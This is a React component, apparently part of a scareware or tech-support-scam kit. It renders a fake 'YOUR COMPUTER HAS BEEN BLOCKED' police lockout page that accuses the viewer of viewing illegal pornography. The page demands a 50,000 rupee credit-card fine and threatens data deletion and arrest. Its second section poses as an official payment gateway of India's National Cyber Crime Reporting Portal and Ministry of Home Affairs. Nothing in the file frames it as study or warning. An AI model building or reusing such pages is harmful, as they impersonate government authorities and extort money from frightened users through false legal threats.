import React from 'react';

const LeftContent = () => {
  return (
    <div className="flex-1 p-2 bg-gray-50 flex flex-col min-h-full">
      <div className="flex-1">
        {/* New "YOUR COMPUTER HAS BEEN BLOCKED" message */}
        <div className="bg-transparent border-2 border-red-600 p-4 rounded-lg mb-4 text-center">
          <h1 className="text-2xl font-bold text-red-600 mb-2">
            YOUR COMPUTER HAS BEEN BLOCKED
          </h1>
          <div className="text-xs text-red-700">(Indian Penal Code act8 Section 1860/292,293)</div>
        </div>

        {/* Expanded Red Alert Message */}
        <div className="bg-red-600 text-white p-6 rounded-lg mb-4 shadow-lg">
          <div className="space-y-4 text-sm leading-relaxed">
            <p className="font-semibold">
              Your browser has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of the India, namely, pornography promoting pedophilia, violence and homosexuality.
            </p>
            
            <p className="font-medium">
              You must pay a fine of Indian rupee 50000 by credit card as prescribed by IPC section 292 and 293.
            </p>
            
            <p className="text-yellow-200 font-semibold">
              Attention! If you fail to pay a fine or attempt to unblock your computer without paying a fine, all information on your device will be permanently deleted in order to prevent the dissemination of pornography.
            </p>
            
            <p>
              The police will come to your home to arrest you and criminal charges will be filed against you. Your device will be unlocked automatically after the fine is paid.
            </p>
            
            <p className="text-sm">
              <strong>Section 292 (1)</strong> A person who distributes or displays in public obscene objects such as documents, drawings or recording media contained in electronic or magnetic records is punished by imprisonment for not more than 2 years, a fine of not more than 250,000 Indian rupee or paltry fine, or both imprisonment and a fine. The same applies to a person who distributes obscene records including electronic or magnetic records through the transmission of telecommunications.
            </p>
            
            <p className="text-sm">
              <strong>(2)</strong> The same applies to a person who possesses the objects referred to in the preceding paragraph or stores electronic or magnetic records referred to in the same paragraph for the purpose of viewing them.
            </p>
            
            <p className="font-medium text-yellow-200">
              Your browser will be unlocked automatically after the fine payment.
            </p>
            
            <p className="text-yellow-200 font-semibold">
              Attention! In case of non-payment of the fine, or your attempts to unlock the device independently, case materials will be transferred to Ministry of Law for the institution of criminal proceedings against you due to commitment a crime.
            </p>
          </div>
        </div>

        <div className="text-center mb-4">
          <h2 className="text-xl font-bold text-gray-800">
            Payment Gateway Security Notice
          </h2>
        </div>
        
        {/* Expanded Payment Gateway Security Notice - White Background */}
        <div className="bg-white border border-gray-300 text-gray-800 p-6 rounded-lg shadow-lg">
          <div className="space-y-4 text-sm leading-relaxed">
            <p>
              <strong>IMPORTANT SECURITY NOTICE:</strong> This is an official payment gateway of the National Cyber Crime Reporting Portal, Ministry of Home Affairs, Government of India. All transactions are processed through secure encrypted channels.
            </p>
            
            <p>
              <strong>Legal Framework:</strong> This portal operates under the Information Technology Act, 2000 and the Indian Penal Code. All cyber crime complaints and associated payments are processed in accordance with the established legal framework of India.
            </p>
            
            <p>
              <strong>Data Protection:</strong> Your personal and financial information is protected under the Personal Data Protection Bill and IT Rules 2011. We employ bank-grade encryption and security protocols to ensure complete confidentiality of your transaction details.
            </p>
            
            <p>
              <strong>Transaction Security:</strong> All payments are processed through RBI approved payment gateways with multi-layer security authentication. Your card details are never stored on our servers and are directly processed by certified payment service providers.
            </p>
            
            <p>
              <strong>Legal Compliance:</strong> By proceeding with this transaction, you acknowledge that this payment is being made in relation to a legitimate cyber crime complaint filed with the National Cyber Crime Reporting Portal. False or fraudulent transactions are punishable under Section 66C and 66D of the IT Act, 2000.
            </p>
            
            <p>
              <strong>Refund Policy:</strong> Refunds, if applicable, will be processed as per the guidelines issued by the Ministry of Home Affairs. Processing time may vary between 7-21 working days depending on your financial institution.
            </p>
            
            <p>
              <strong>Technical Support:</strong> For technical assistance regarding payment issues, please contact our 24/7 helpline at 1930 or email support@cybercrime.gov.in. Our technical team is available round the clock to assist with payment related queries.
            </p>
            
            <p>
              <strong>Authentication Process:</strong> This transaction requires multi-factor authentication including OTP verification, biometric validation where applicable, and identity verification as per RBI guidelines for digital payments.
            </p>
            
            <p className="font-semibold text-red-600">
              WARNING: This is a secured government portal. Any attempt to manipulate, hack, or illegally access this system is a criminal offense under the IT Act, 2000 and will be prosecuted to the full extent of the law.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LeftContent;
